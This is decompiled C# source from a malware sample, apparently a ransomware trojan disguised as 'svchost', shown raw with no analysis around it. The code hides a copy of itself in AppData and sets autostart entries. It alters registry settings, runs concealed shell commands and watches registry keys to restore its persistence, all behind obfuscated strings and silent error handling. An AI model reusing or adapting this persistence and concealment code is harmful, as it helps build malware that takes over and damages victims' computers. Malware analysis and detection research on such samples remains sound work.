// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0005\u2001
{
  private static \u0005\u2002 \u0002;
  private static \u0005\u2002 \u0003;

  public void \u0002()
  {
    this.\u0005();
    this.\u0008();
    this.\u0003();
    new Thread(new ThreadStart(this.\u0006)).Start();
  }

  private void \u0003()
  {
    try
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string executablePath = Application.ExecutablePath;
      if (!Directory.Exists(folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F))
        Directory.CreateDirectory(folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F).Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
      if (File.Exists(folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000E))
        return;
      File.Copy(executablePath, folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000E);
      FileInfo fileInfo = new FileInfo(folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000E);
      \u0005\u2001.\u0002(folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F, \u0002\u2002.\u000E);
      fileInfo.Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden;
      Process.Start(folderPath + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000E);
      Environment.Exit(0);
    }
    catch
    {
    }
  }

  public static void \u0002()
  {
    try
    {
      \u0005\u2001.\u0002.\u0005();
      \u0005\u2001.\u0003.\u0005();
      (!\u000E\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine).OpenSubKey(\u0008\u2003.\u0002(415307787), true).SetValue(\u0002\u2002.\u0002\u2000, (object) string.Empty);
      string name = \u0008\u2003.\u0002(415308287);
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000E;
      RegistryKey registryKey1 = !\u000E\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine;
      RegistryKey registryKey2;
      using (registryKey2 = registryKey1.OpenSubKey(\u0008\u2003.\u0002(415308235), true))
      {
        if (registryKey2.GetValue(name) == null)
        {
          registryKey2.SetValue(name, (object) \u0008\u2003.\u0002(415308215));
        }
        else
        {
          string str2 = registryKey2.GetValue(name).ToString();
          if (!str2.Contains(str1))
            registryKey2.SetValue(name, (object) str2);
        }
      }
      Environment.Exit(0);
    }
    catch
    {
    }
  }

  public static void \u0002(string _param0, string _param1)
  {
    try
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = \u0008\u2003.\u0002(415308186),
        RedirectStandardInput = true,
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
      };
      process.Start();
      StreamWriter standardInput = process.StandardInput;
      standardInput.WriteLine(\u0008\u2003.\u0002(415308180) + _param0);
      standardInput.WriteLine(\u0008\u2003.\u0002(415308142) + _param1 + \u0008\u2003.\u0002(415308101));
      standardInput.WriteLine(\u0008\u2003.\u0002(415308076));
      standardInput.Close();
    }
    catch
    {
    }
  }

  private void \u0005()
  {
    try
    {
      Environment.SetEnvironmentVariable(\u0008\u2003.\u0002(415308071), \u0008\u2003.\u0002(415308035), EnvironmentVariableTarget.User);
      RegistryKey registryKey1 = (!\u000E\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine).OpenSubKey(\u0008\u2003.\u0002(415308059), true);
      if (registryKey1 != null && registryKey1.GetValue(\u0008\u2003.\u0002(415308507)) != null)
        registryKey1.SetValue(\u0008\u2003.\u0002(415308507), (object) \u0008\u2003.\u0002(415307966));
      RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(\u0008\u2003.\u0002(415308059), true);
      if (registryKey2 != null && registryKey2.GetValue(\u0008\u2003.\u0002(415308459)) != null)
        registryKey2.SetValue(\u0008\u2003.\u0002(415308459), (object) \u0008\u2003.\u0002(415307966));
      RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(\u0008\u2003.\u0002(415308428), true);
      if (registryKey3 == null || registryKey3.GetValue(\u0008\u2003.\u0002(415308366)) == null)
        return;
      registryKey3.SetValue(\u0008\u2003.\u0002(415308366), (object) \u0008\u2003.\u0002(415308379));
    }
    catch
    {
    }
  }

  private void \u0008()
  {
    try
    {
      string name = \u0008\u2003.\u0002(415308287);
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000F + \u0008\u2003.\u0002(415307827) + \u0002\u2002.\u000E;
      RegistryKey registryKey1 = !\u000E\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine;
      RegistryKey registryKey2;
      using (registryKey2 = registryKey1.OpenSubKey(\u0008\u2003.\u0002(415308235), true))
      {
        if (registryKey2.GetValue(name) == null)
        {
          registryKey2.SetValue(name, (object) (\u0008\u2003.\u0002(415308371) + str1));
        }
        else
        {
          string str2 = registryKey2.GetValue(name).ToString();
          if (!str2.Contains(str1))
            registryKey2.SetValue(name, (object) (str2 + str1));
        }
      }
      (!\u000E\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine).OpenSubKey(\u0008\u2003.\u0002(415307787), true).SetValue(\u0002\u2002.\u0002\u2000, (object) str1);
    }
    catch
    {
    }
  }

  private void \u0006()
  {
    try
    {
      List<string> stringList = new List<string>();
      if (\u000E\u2001.\u0002())
      {
        stringList.Add(Registry.LocalMachine.Name + \u0008\u2003.\u0002(415308327));
        stringList.Add(Registry.LocalMachine.Name + \u0008\u2003.\u0002(415308772));
      }
      else
      {
        stringList.Add(Registry.CurrentUser.Name + \u0008\u2003.\u0002(415308327));
        stringList.Add(Registry.CurrentUser.Name + \u0008\u2003.\u0002(415308772));
      }
      \u0005\u2001.\u0002 = new \u0005\u2002(stringList[0]);
      \u0005\u2001.\u0003 = new \u0005\u2002(stringList[1]);
      \u0005\u2001.\u0002.\u0002(new EventHandler(this.\u0002));
      \u0005\u2001.\u0003.\u0002(new EventHandler(this.\u0002));
      \u0005\u2001.\u0002.\u0003();
      \u0005\u2001.\u0003.\u0003();
    }
    catch
    {
    }
  }

  private void \u0002(object _param1, EventArgs _param2) => this.\u0008();
}
